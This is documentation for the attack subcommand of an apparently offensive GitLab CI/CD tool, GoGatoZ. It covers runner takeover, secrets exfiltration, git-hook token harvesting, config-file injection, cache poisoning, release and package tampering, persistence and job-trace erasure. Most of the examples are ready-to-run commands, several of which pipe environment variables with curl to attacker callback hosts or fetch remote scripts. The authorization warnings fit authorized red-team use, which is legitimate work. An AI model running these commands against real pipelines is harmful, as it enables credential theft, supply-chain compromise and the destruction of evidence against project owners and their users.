---
title: Attack Command
description: Target GitLab CI/CD pipelines with payloads, secrets exfiltration, and Runner-on-Runner attacks
---

The attack command targets GitLab CI/CD pipelines. It can stage malicious pipelines, generate attack payloads, attempt self-hosted GitLab Runner takeover (Runner-on-Runner), and exfiltrate secrets. Use only with explicit authorization.

> Warning: Offensive features are for ethical security testing only.

## Basic Usage

```bash
gogatoz attack [options]
```

- Target projects can be specified by numeric ID or path-with-namespace (e.g., group/subgroup/project).
- GoGatoZ reads auth and instance from global flags or env (GITLAB_TOKEN, GITLAB_URL).

## Modes

- Commit CI to target repo: `--commit-ci` with exactly one CI source: `--ci-yaml`, `--ci-file`, `--ci-stdin`, or `--payload`.
- Secrets exfiltration: `--secrets` creates a pipeline that posts environment/variables to a webhook (optionally RSA-encrypts).
- Payload rendering only: `--payload-only` prints a single-job .gitlab-ci.yml to stdout without committing.

## Key Options

### Targeting and commit metadata
- `--target` string: Project ID or path-with-namespace to attack.
- `--branch` string: Branch to commit CI to (default: gogatoz-attack). Supports deconflict strategies.
- `--message` string: Commit message.
- `--author-name` string: Commit author name.
- `--author-email` string: Commit author email.
- `--deconflict` string: Branch naming strategy: fail|suffix|force (default: fail).

### CI content sources (use one)
- `--ci-yaml` string: Inline CI YAML.
- `--ci-file` string: Path to CI YAML file.
- `--ci-stdin`: Read CI YAML from stdin.
- `--payload` string: Generate CI from a built-in payload. Values:
  - `ror-shell`: Minimal shell on runner via script/command.
  - `runner-on-runner` (alias: `ror`): Runner takeover; can keep alive.
  - `pwn-request`: MR-conditioned job to exploit risky merge rules.
  - `secrets` (alias: `secrets-exfil`): Dump env/variables to webhook.
  - `git-hook`: Install git hooks on runner build dirs to capture tokens from subsequent jobs.
  - `cache-poison`: Poison CI cache with malicious content (targets shared cache keys).

### Common payload options
- `--job-name` string: Job name.
- `--stage` string: Stage name (default: attack).
- `--tags` string: Comma-separated runner tags to target.
- `--image` string: Docker image to use.
- `--manual`: Add manual rule (requires manual job start).
- `--artifacts-path` string: Path to upload as artifact.
- `--artifacts-expire` string: expire_in value (e.g., 1 day).

### ror-shell options
- `--cmd` string: Command to run (default: `id; uname -a`).
- `--download` string: URL to curl/wget instead of running a command.

### runner-on-runner options
- `--script-url` string: Remote script URL to execute.
- `--os` string: linux|windows|macos (default: linux).
- `--keepalive` int: Emit heartbeats every N seconds to stay alive.
- Discovery helpers:
  - `--discover-tags`: List runner tags available to the project and exit.
  - `--executor` string: Filter discovered tags by executor hint (docker|shell|kubernetes).

### pwn-request options
- `--target-branch-regex` string: Regex for target branch condition in MR context.

### secrets exfil options
- `--webhook` string: Webhook URL to POST exfil data (payload mode).
- `--pubkey-file` string: Path to RSA public key to encrypt payload output.
- Also available when using `--secrets` (JSON output controls):
  - `--project-vars`: Include project variables in output.
  - `--group-vars`: Include group variables in output.
  - `--group-id` string: Group ID or full path when listing group variables.
  - `--include-protected`: Include protected variables.

### git-hook options
- `--hook-type` string: Hook type: post-checkout, post-merge, pre-push (default: post-checkout).
- `--webhook` string: Callback URL to POST captured env data to.

### cache-poison options
- `--cache-key` string: Cache key to target (default: default).
- `--cache-path` string: Cache path to poison (default: .).
- `--poison-cmd` string: Command to run for cache poisoning.

### Script injection (`--inject-script`)

Modify repo scripts called by CI (workflow hopping) — harder to detect than CI config changes.

- `--script-path` string: Path to script to inject into (auto-detected from CI if empty).
- `--script-payload` string: Shell payload to inject.
- `--script-payload-file` string: Read payload from file.
- `--script-prepend` bool: Prepend payload (default: true) or append.
- `--trigger-pipeline` bool: Trigger a pipeline after injection.

### LOTP config-file injection (`--lotp-inject`)

Weaponize a tool's configuration file so that the next pipeline run executes an attacker-controlled command. Based on the [Living off the Pipeline (LOTP)](https://boostsecurityio.github.io/lotp/) catalog of 60+ tools that are "RCE-by-design" in CI.

- `--lotp-tool` string: Tool to weaponize (required): `npm-gyp`, `npm`, `make`, `pytest`, `goreleaser`, `gradle`, `terraform`
- `--cmd` string: Shell command to inject (required).
- `--trigger-pipeline` bool: Trigger a pipeline on the branch after injecting.

Output JSON fields: `branch`, `tool`, `files_committed`, `description`, `reference`, optionally `pipeline_url`.

**Available LOTP tools:**

| Tool | Files committed | Trigger |
|------|----------------|---------|
| `npm-gyp` / `gyp` | `binding.gyp` + `index.js` | `npm install` (via node-gyp, bypasses package.json hooks) |
| `npm` | `package.json` | `npm install` (postinstall hook) |
| `make` | `Makefile` | `make` ($(shell) expansion at parse time) |
| `pytest` | `conftest.py` | `pytest` (auto-imported at collection) |
| `goreleaser` | `.goreleaser.yml` | `goreleaser release/build/check` (before hooks) |
| `gradle` | `build.gradle` | `gradle`/`./gradlew` (Groovy config-time exec) |
| `terraform` | `main.tf` | `terraform plan`/`apply` (null_resource local-exec) |

**Payload-only rendering (no credentials needed):**
```bash
gogatoz attack --payload-only --payload lotp-gyp --cmd 'id'
gogatoz attack --payload-only --payload lotp-make --cmd 'printenv | curl -sd @- https://callback.url'
```
Output is JSON with `tool`, `files[]` (path + content), `description`, `reference`.

**Example — Phantom Gyp attack:**
```bash
# Generate and inspect the payload (no token needed)
gogatoz attack --payload-only --payload lotp-gyp \
  --cmd 'printenv | curl -sd @- https://callback.example.com' | jq .

# Inject into target project (Developer access required)
gogatoz attack --target group/nodejs-project \
  --lotp-inject --lotp-tool npm-gyp \
  --cmd 'printenv | curl -sd @- https://callback.example.com' \
  --branch lotp-attack --deconflict suffix --json
```

**The Phantom Gyp technique** (StepSecurity research): Places `binding.gyp` + `index.js` in the repo. When `npm install` runs, npm auto-invokes `node-gyp rebuild`. The gyp `<!(node index.js)` command substitution executes the payload. No `preinstall`/`postinstall` appears in `package.json` — bypassing the most common npm hook monitors. The command is base64-encoded in `index.js` to evade string matching.

### Auto-merge (`--auto-merge`)

Create MR, self-approve, and merge to default branch (supply chain attack).

- `--auto-merge-file` string: File path to modify (default: .gitlab-ci.yml).
- Uses `--ci-yaml`, `--ci-file`, `--ci-stdin`, or `--payload` for content.
- Uses `--mr-title`, `--mr-description`, `--mr-target-branch` for MR creation.

### Token harvest (`--harvest`)

Install git hooks on runner then wait for callbacks to harvest tokens.

- `--webhook` string: External URL reachable from CI runners (required).
- `--harvest-listen` string: Listen address for callback server (default: :9443).
- `--harvest-timeout` string: How long to wait for callbacks (default: 30m).

### Release tampering (`--tamper-release`)

Modify GitLab release metadata and asset links (supply chain attack).

- `--tag-name` string: Release tag name (required).
- `--release-name` string: New release name.
- `--release-description` string: New release description.
- `--link-name` string: Release link name to replace.
- `--link-url` string: New URL for the replaced link.
- `--add-link-name` string: Name of new link to add.
- `--add-link-url` string: URL of new link to add.

### Package tampering (`--tamper-package`)

Upload a malicious package to the Generic Packages registry.

- `--package-name` string: Package name (required).
- `--package-version` string: Package version (required).
- `--package-file` string: Local file to upload (required).

### Persistence modes
- `--deploy-key`: Create a deploy key with write access on the target project.
- `--key-title` string: Title for the deploy key.
- `--key-path` string: Path to save the generated private key.
- `--add-member`: Add a user as project member.
- `--member-username` string: Username to add as project member.
- `--member-role` string: Access level: guest|reporter|developer|maintainer (default: developer).

See [Persistence Command](/user-guide/command-reference/persistence/) for detailed usage.

### Cleanup helpers
- `--cleanup`: Enable cleanup mode (no attack is executed).
- `--cleanup-branch` string: Delete a branch in the target project.
- `--cleanup-ci`: Remove .gitlab-ci.yml from the target branch.
- `--revoke-deploy-key` int: Revoke deploy key by ID.
- `--remove-member-id` int: Remove member by user ID.
- `--cleanup-pipeline` int: Delete a specific pipeline by ID.
- `--cleanup-jobs` bool: Erase job traces on recent pipelines.
- `--cleanup-jobs-ref` string: Limit erasure to pipelines on this ref.
- `--cleanup-jobs-max` int: Max recent pipelines to erase (default: 5).
- `--cleanup-jobs-delete` bool: Also delete pipelines after erasing traces.

## Examples

### 1) Discover runner tags
```bash
gogatoz attack --target group/proj --discover-tags
```

### 2) Generate a Runner-on-Runner payload only
```bash
gogatoz attack --payload runner-on-runner \
  --script-url https://attacker.example/p.sh --os linux --keepalive 30 \
  --job-name ror --stage attack --tags docker,priv
```

### 3) Commit a Runner-on-Runner payload to a staging branch
```bash
gogatoz attack --commit-ci --target group/proj \
  --payload ror --script-url https://attacker/p.sh --tags shell \
  --branch gogatoz-attack --deconflict suffix --message "stage RoR payload"
```

### 4) Secrets exfiltration with RSA
```bash
# Render payload only
gogatoz attack --payload secrets --webhook https://webhook.site/abc --pubkey-file pub.pem --payload-only

# Or commit directly
gogatoz attack --secrets --target group/proj --tags docker --pubkey-file pub.pem
```

### 5) Pwn Request (condition on target branch)
```bash
gogatoz attack --commit-ci --target group/proj \
  --payload pwn-request --target-branch-regex '^release/.*$' \
  --message "pwn request: release branch side effects"
```

### 6) Cleanup artifacts
```bash
gogatoz attack --target group/proj --cleanup --cleanup-branch gogatoz-attack
```

### 7) Script injection (workflow hopping)
```bash
gogatoz attack --inject-script --target group/proj \
  --script-payload 'curl -sS -d "$(printenv|base64 -w0)" http://attacker/cb' \
  --branch gogatoz-attack --deconflict suffix
```

### 8) Auto-merge supply chain attack
```bash
gogatoz attack --auto-merge --target group/proj \
  --ci-yaml 'stages:\n  - pwn\npwn:\n  stage: pwn\n  script: [printenv]\n  tags: [shell]' \
  --mr-title "Fix CI configuration"
```

### 9) Token harvest mode
```bash
gogatoz attack --harvest --target group/proj \
  --webhook https://attacker.example/callback --tags shell \
  --harvest-timeout 10m
```

### 10) Release tampering
```bash
gogatoz attack --tamper-release --target group/proj \
  --tag-name v1.2.0 --add-link-name "Binary (linux-amd64)" \
  --add-link-url "https://attacker.example/malicious-binary"
```

### 11) Cache poisoning payload
```bash
gogatoz attack --commit-ci --target group/proj \
  --payload cache-poison --cache-key shared-deps \
  --poison-cmd 'echo "malicious" > node_modules/package.json' --tags shell
```

### 12) Anti-forensics cleanup
```bash
gogatoz attack --target group/proj --cleanup --cleanup-jobs \
  --cleanup-jobs-ref gogatoz-attack --cleanup-jobs-max 3
```

## Security Considerations

- Obtain written authorization before testing.
- Avoid production disruption; prefer test projects.
- Review and remove artifacts (branches, CI YAML, keys, users) after testing.

## Authentication and Scopes

Use GitLab Personal Access Tokens with scopes: api, read_repository, write_repository. Set via `--token` or env `GITLAB_TOKEN`. Instance can be set via `--gitlab-url` or env `GITLAB_URL`.
